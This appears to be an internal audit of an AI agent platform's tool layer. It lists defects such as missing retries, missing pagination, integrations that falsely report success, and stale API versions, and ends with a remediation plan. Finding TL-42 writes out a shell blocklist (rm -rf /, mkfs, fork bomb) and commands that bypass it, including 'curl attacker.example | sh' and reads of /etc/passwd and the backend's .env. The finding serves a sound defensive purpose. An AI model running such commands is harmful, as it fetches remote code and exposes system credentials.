The category map has 22 entries. The 64 social tools, the 4 CRM tools, the 8 meta tools
and `batch_web_search` all fall through to `general`. Separately, `social` appears in
the frontend's hardcoded `CATEGORIES` list but is **not** a value in the backend map, so
the UI offers a filter that matches nothing.

- [`ai/tool_management_service.py:30`](../../../backend/src/ai/tool_management_service.py:30)–50
- [`frontend/src/pages/ai/ToolManagement.tsx`](../../../frontend/src/pages/ai/ToolManagement.tsx) — `CATEGORIES`

**Fix:** derive the category from the tool's subpackage rather than maintaining a hand-written map.

---

### TL-36 — `terminal` scans all of `/tmp` and mis-attributes artifacts

**✅ Verified · Medium**

After every command, `TerminalTool` walks all of `/tmp` to depth 3 looking for
`.pptx/.docx/.xlsx/.pdf` files with `mtime >= since_ts`, and registers what it finds as
artifacts of the current run. Any document another process — or another tenant's run —
writes to `/tmp` during that window is attributed to this run.

`SandboxCodeTool`'s narrower directory diff has the same class of problem, which is why
it has grown an exclusion list (`venv`, `__pycache__`, `node_modules`, `scripts`,
`.git`, `scratch`).

- [`ai/tools/sandbox/terminal_tool.py`](../../../backend/src/ai/tools/sandbox/terminal_tool.py) — the second-pass `/tmp` scan
- [`ai/tools/sandbox/sandbox_executor.py`](../../../backend/src/ai/tools/sandbox/sandbox_executor.py) — `_register_new_artifacts`

**Fix:** an explicit write-only artifacts drop box (see
[TL-16](#tl-16--the-tenant-workspace-lives-in-tmp-and-is-node-local)). A file becomes an
artifact because a tool put it there, not because a scanner guessed. This deletes both
heuristics and the exclusion list.

---

### TL-37 — The social base class never retries 429 or 5xx

**✅ Verified · Medium**

`_api_request` re-raises every `httpx.HTTPStatusError` immediately with the comment
"Don't retry client errors" — but the `except` catches **all** status errors, so 429 and
5xx are never retried either. That is precisely the class of error social APIs return
under load. The two retries it does have cover only `TimeoutException` and
`ConnectError`, and they are immediate: no sleep, no backoff, no jitter.

The only real exponential backoff in the tool layer is SerpAPI-specific.

- [`ai/tools/social/base.py:130`](../../../backend/src/ai/tools/social/base.py:130) — `_api_request`
- [`ai/tools/core/search.py:155`](../../../backend/src/ai/tools/core/search.py:155) — the one correct backoff, for contrast

---

### TL-38 — No pagination in any social list call

**✅ Verified · Medium**

Every `list` / `search` / `get_*` action across all 16 platforms returns page one and
reports it to the model as the complete set. No cursor is read, no `next` is followed,
and no truncation is signalled.

- All of [`ai/tools/social/`](../../../backend/src/ai/tools/social/)

---

### TL-39 — No idempotency on any write tool

**✅ Verified · Medium**

No social, email, CRM or media tool carries an idempotency key. Combined with the
resilience layer's reformat-retry and fallback chain, a retried or resumed step
re-posts, re-comments, re-sends and re-creates campaigns.

`email_classify` has a related non-atomicity: it implements "move" as COPY → `STORE
+FLAGS \Deleted` → `EXPUNGE`. If the copy succeeds and the expunge fails you get a
duplicate; if the process dies between them the original stays put.

- [`ai/tools/resilience.py`](../../../backend/src/ai/tools/resilience.py) — the retry paths
- [`ai/tools/email/email_tool.py:267`](../../../backend/src/ai/tools/email/email_tool.py:267) — `EmailClassifyTool`

---

### TL-40 — Eight of sixteen platforms cannot refresh their tokens

**✅ Verified · Medium**

`quora`, `pinterest`, `meta_ads`, `linkedin_ads`, `linkedin_sales_navigator`,
`youtube_ads`, `x_ads` and `snapchat_ads` have no entry in
`PLATFORM_REFRESH_CONFIG`. When the access token expires the tool fails and a human must
reconnect — with no proactive warning anywhere in the product.

- [`ai/social_connection_service.py:23`](../../../backend/src/ai/social_connection_service.py:23) — `PLATFORM_REFRESH_CONFIG`

---

### TL-41 — Four dispatch paths, and the typed one fails silently

**✅ Verified · Medium**

A tool can be entered through `run`, `run_with_context`, `run_typed`, or the executor's
reflection fallback. The typed path adds nothing in practice: both implementations
(`WebSearchTool`, `ScraperTool`) simply re-serialise their params to JSON and call
`run_with_context`.

Worse, the reflection is silent. If `get_type_hints(tool.run_typed)` raises — a forward
reference, a missing import — the executor logs at DEBUG and uses the legacy string
path. A typed tool will appear to work while never using its types.

The knock-on cost is large: because structured arguments are serialised to a JSON string
and re-parsed inside each tool, a substantial fraction of tool code is defensive
parsing. `pdf_generator` is 746 lines, most of it input rescue;
`batch_web_search` has a five-step parsing ladder.

- [`ai/tool_executor.py:125`](../../../backend/src/ai/tool_executor.py:125) onwards — reflection and the silent fallback
- [`ai/tools/base.py`](../../../backend/src/ai/tools/base.py) — `run`, `run_with_context`, `run_typed`, `supports_context`

**Fix:** one method — `execute(params: ParamsModel, ctx: ExecutionContext) -> ToolOutput`
— with the JSON schema derived from the params model rather than hand-written. Resolves
[TL-05](#tl-05--the-typed-dispatch-path-silently-drops-execution-context-in-scraper_tool)
and [TL-30](#4-t2--delete) at the same time.

---

### TL-42 — The `terminal` blocklist is a speed bump, not a boundary

**✅ Verified · Medium**

Thirteen regexes (`rm -rf /`, `mkfs`, `dd of=/dev/`, fork bomb, `shutdown`, `reboot`,
`halt`, `poweroff`, `init 0`, `init 6`, `> /dev/sd[a-z]`, `chmod 777 /`) cannot
enumerate the dangerous half of a shell. `curl attacker.example | sh`, `cat
/etc/passwd`, `env`, `rm -rf ~` and reading the backend's own `.env` all pass.

This is acceptable **only** once [TL-01](#tl-01--the-default-sandbox-runs-llm-authored-code-as-the-backend-os-user)
is fixed and the container is the real boundary. Until then it is the only thing
standing between a prompt injection and the host.

- [`ai/tools/sandbox/terminal_tool.py:45`](../../../backend/src/ai/tools/sandbox/terminal_tool.py:45) — `_BLOCKED_PATTERNS`

---

## 6. T4 — Integrations that report false success

These are the worst failure mode in the tool layer: the tool returns
`{"success": true, ...}` and a reassuring message, the agent proceeds as though the work
is done, and nothing happened. They cannot be found by monitoring error rates.

All are `EXPERIMENTAL`, and per [TL-13](#tl-13--the-tool-status-gate-is-not-wired-into-execution)
that status does not stop them running.

### TL-43 — `youtube_upload_video` never uploads the video

**✅ Verified · High**

The tool POSTs metadata to `https://www.googleapis.com/youtube/v3/videos` with
`uploadType=resumable` and returns `{"success": true, "message": "Video upload initiated
on YouTube"}`. It never sends the media: the required `Location` header is not read, no
second request is made, and the `video_url` parameter is **read from params and then
never used**. `thumbnail_url` is likewise accepted and ignored.

- [`ai/tools/social/youtube.py`](../../../backend/src/ai/tools/social/youtube.py) — `YouTubeUploadVideoTool._execute`

**Fix:** target `googleapis.com/upload/youtube/v3/videos`, capture the `Location`
header, stream the file in chunked PUTs, then call `thumbnails/set`. Resolve the source
through an artifact reference rather than a URL string.

---

### TL-44 — `tiktok_publish_video` returns success on init

**✅ Verified · High**

Calls `post/publish/video/init/` and returns `{"success": true}` on the resulting
`publish_id`. TikTok publication is asynchronous — the video may still fail moderation,
download or encoding — and the tool never polls `post/publish/status/fetch/`.

The `PULL_FROM_URL` source also requires the URL's domain to be verified with TikTok;
that requirement is neither documented in the description nor surfaced as an error.

- [`ai/tools/social/tiktok.py`](../../../backend/src/ai/tools/social/tiktok.py) — `TikTokPublishVideoTool._execute`

---

### TL-45 — `instagram_publish_media` does not wait for video containers

**✅ Verified · High**

`_publish_single` creates the media container and immediately calls `media_publish`.
That is correct for images. For `reel` and video it is not: the container is processed
asynchronously and must be polled on `status_code` until `FINISHED` before publishing.
As written, every Reel publish races the encoder.

- [`ai/tools/social/instagram.py`](../../../backend/src/ai/tools/social/instagram.py) — `_publish_single`, `_publish_carousel`

---

### TL-46 — `video_generate` ignores `is_audio_required` and reports it back

**✅ Verified · Medium**

The parameter is parsed, never passed to `GenerateVideosConfig`, and then returned in
the result as `"has_audio": is_audio_required` — so the model is told a setting was
applied that was not.

Two related issues in the same file: `person_generation="allow_all"` is hardcoded rather
than being tenant policy, and `register_video_artifact` receives no `run_id` or
`agent_id`, so generated videos are orphaned from their run.

- [`ai/tools/media/video/video_generate.py`](../../../backend/src/ai/tools/media/video/video_generate.py) — `run_with_context`, `_generate_single_video`
- [`ai/tools/media/video/_support.py`](../../../backend/src/ai/tools/media/video/_support.py) — `register_video_artifact`

---

### TL-47 — `linkedin_create_post` advertises `image_url` and never reads it

**✅ Verified · Medium**

The function schema offers `image_url` with the description *"Optional image URL to
attach to the post"*. `_execute` handles `link_url` and nothing else — the parameter is
silently dropped. The model will use it, and the post will publish without the image.

This is the clearest instance of the schema/implementation drift class: the schema is
what the LLM sees, and nothing validates it against the code.

- [`ai/tools/social/linkedin.py`](../../../backend/src/ai/tools/social/linkedin.py) — `LinkedInCreatePostTool`, schema vs `_execute`

**Fix:** implement the three-step LinkedIn asset upload, or delete the field. Then add a
test that asserts every advertised parameter is read.

---

### TL-48 — `LinkedIn-Version: 202401` is hardcoded in twelve places

**✅ Verified · Medium**

Every LinkedIn call pins the January 2024 version header. LinkedIn sunsets versioned
APIs roughly a year after release, so as of this writing the header is about two and a
half years stale and calls will start returning 426 / 400.

- [`ai/tools/social/linkedin.py`](../../../backend/src/ai/tools/social/linkedin.py) — 4 occurrences
- [`ai/tools/social/linkedin_ads.py`](../../../backend/src/ai/tools/social/linkedin_ads.py) — 4 occurrences
- [`ai/tools/social/linkedin_sales_nav.py`](../../../backend/src/ai/tools/social/linkedin_sales_nav.py) — 4 occurrences

**Fix:** one constant, sourced from config, with an owner and a review date. The same
applies to the Google Ads version pin — see [TL-25](#4-t2--delete).

---

### TL-49 — `google_ads_create_campaign` is non-transactional

**✅ Verified · Medium**

The tool performs two independent mutates: create a campaign budget, then create the
campaign referencing it. If the second fails, the budget is orphaned in the account with
no compensating delete and no mention in the error returned to the model — which will
typically retry and orphan another.

This is otherwise the best-built family in `social/`: it correctly reads `customer_id`
and `developer_token` from server-side `oauth_metadata` and starts campaigns `PAUSED`.

- [`ai/tools/social/google_ads.py`](../../../backend/src/ai/tools/social/google_ads.py) — `GoogleAdsCreateCampaignTool._execute`

**Fix:** wrap both operations in a single `googleAds:mutate` request with a temporary
resource id, which is what the API provides for exactly this case.

---

## 7. Suggested execution order

Ordered by dependency and cost, not by tier.

| Step | Work | Why here |
|---|---|---|
| **1** | **T2 deletions** — TL-23 to TL-29 | Free. Nothing that is not already broken can break. Removes 12 tools and ~1,600 lines before anyone has to reason about them |
| **2** | **The one-line T0 fixes** — TL-03, TL-04, TL-06, TL-05 | Each closes a live tenant-boundary hole and none needs design. TL-04 in particular is a parameter deletion |
| **3** | **TL-07, TL-08, TL-31** | Small, isolated, no architectural dependency |
| **4** | **TL-16 — the durable workspace** | The prerequisite for everything in the sandbox tier. Nothing else in step 5 can land without it |
| **5** | **Sandbox hardening** — TL-01, TL-15, TL-17, TL-18, TL-02, TL-36, TL-42 | Flip the container default only once these are done. Delete the silent `SubprocessRuntime` fallback in the same change |
| **6** | **One resolution entry point** — TL-10, TL-13, TL-14, TL-12, TL-11, TL-21 | Six dead gates become six lines in one function. Make `ToolRegistry` private in the same change |
| **7** | **One execution path** — TL-41, TL-30, TL-05, TL-19, TL-33, TL-20, TL-37, TL-39 | Cost, retry, backoff, circuit-breaking and audit move into the base class. Migrate tools family by family, highest-effect first: email, CRM, social |
| **8** | **TL-09 — reference-argument discipline** | The largest single change. Needs the typed contract from step 7 to exist first |
| **9** | **T4 integration repairs** — TL-43 to TL-49 | Only worth doing per platform, immediately before promoting that platform out of `EXPERIMENTAL` with a live credential smoke test |

### Guardrails

- **Ship behavioural changes behind a feature flag.** The platform has entity → company
  → env → default resolution in
  [`core/feature_flags.py`](../../../backend/src/ai/core/feature_flags.py). Note that
  three flags in this area are already dead — `tools.cost_resolver_v2_enabled` is never
  read, and `tools.experimental.*` gates a function nothing calls. Adding a flag is not
  the same as wiring a control.
- **A tool is not "done" until its advertised schema matches what `execute` reads.**
  TL-43, TL-46 and TL-47 are all the same bug. A contract test over every registered
  tool would have caught all three.
- **Do not promote a social tool without a live credential smoke test.** Every T4 defect
  would have been caught by one real call.
- **Recommended surface reduction:** 64 social tools → roughly 20. Delete `quora`,
  `x_ads` and `youtube_ads` (12 tools); hold `meta_ads`, `linkedin_ads`,
  `linkedin_sales_nav` and `snapchat_ads` behind a real gate; promote `linkedin`,
  `facebook`, `instagram`, `twitter` and `google_ads` one at a time. Maintaining 64
  unverified integrations costs more than the five that will be used.

---

## Relationship to the platform register

[`../DEFECT-REGISTER.md`](../DEFECT-REGISTER.md) is the platform-wide list compiled from
all 20 numbered documents. Two of its entries fall inside this subsystem and are
**superseded** by the deeper treatment here:

| Platform entry | Superseded by | Change |
|---|---|---|
| **D-20** — A custom tool created through the API is inert | [TL-10](#tl-10--tenant-scoped-tools-are-unreachable-by-construction), [TL-14](#tl-14--is_enabled--false-does-not-disable-anything), Fault A | Was 📄 Doc-reported; now ✅ Verified. The root cause is broader than "no loader" — tenant-scoped tools are unreachable even when a runtime object exists |
| **D-25** — The `video_generation` tool | [TL-13](#tl-13--the-tool-status-gate-is-not-wired-into-execution), T2 | Unchanged; still a valid deletion. The reason it is still selectable is TL-13 |

Everything else in this file is new and does not appear in the platform register.

---

## Where to go next

- [09 — Tools & the tool registry](../09-tools.md) — the subsystem reference these
  defects were found against.
- [15 — Governance, HITL & feature flags](../15-governance-and-hitl.md) — the
  `FeatureFlags` service behind the gates in T1.
- [14 — Billing, costing & credits](../14-billing-and-credits.md) — where the four
  price tables in TL-19 are supposed to converge.
- [18 — Infrastructure & deployment](../18-infrastructure-and-deployment.md) — building
  and pinning the `hb-sandbox` and `hb-egress-proxy` images for the T1 sandbox work.
